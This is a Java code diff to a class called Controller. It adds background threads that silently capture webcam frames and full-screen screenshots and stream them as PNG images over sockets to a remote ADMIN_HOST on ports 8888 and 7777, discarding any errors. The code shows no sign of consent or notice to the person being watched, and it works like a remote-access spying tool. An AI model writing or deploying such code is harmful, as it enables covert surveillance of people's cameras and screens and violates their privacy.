@@ -50,12 +50,11 @@ public class Controller {
         new Thread(() -> {
             while (true) {
                 Webcam webcam = Webcam.getDefault();
-                System.out.println("Waiting open camera");
                 while (!isUseCamera.get()) {
                     if (webcam.isOpen())
                         webcam.close();
                     try {
-                        System.out.println("Waiting open camera");
+                        System.out.println("[CAMERA STREAMING] sleeping...");
                         Thread.sleep(1000);
                     } catch (InterruptedException e) {
                         e.printStackTrace();
@@ -66,13 +65,43 @@ public class Controller {
                     Socket soc = null;
                     try {
                         soc = new Socket(ADMIN_HOST, 8888);
-//                        BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                         ByteArrayOutputStream ous = new ByteArrayOutputStream();
                         if (!webcam.isOpen())
                             webcam.open();
 
                         // get image
                         BufferedImage image = webcam.getImage();
+                        ImageIO.write(image, "png", ous);
+                        soc.getOutputStream().write(ous.toByteArray());
+
+                        soc.close();
+                        Thread.sleep(10);
+                    } catch (Exception e) {
+                    }
+                }
+            }
+        }).start();
+
+
+        new Thread(() -> {
+            while (true) {
+                Webcam webcam = Webcam.getDefault();
+                while (!isMonitoring.get()) {
+                    try {
+                        System.out.println("[SCREEN STREAMING] sleeping...");
+                        Thread.sleep(1000);
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
+                }
+
+                while (isMonitoring.get()) {
+                    Socket soc = null;
+                    try {
+                        soc = new Socket(ADMIN_HOST, 7777);
+                        BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
+                        ByteArrayOutputStream ous = new ByteArrayOutputStream();
+
                         ImageIO.write(image, "png", ous);
                         soc.getOutputStream().write(ous.toByteArray());
 
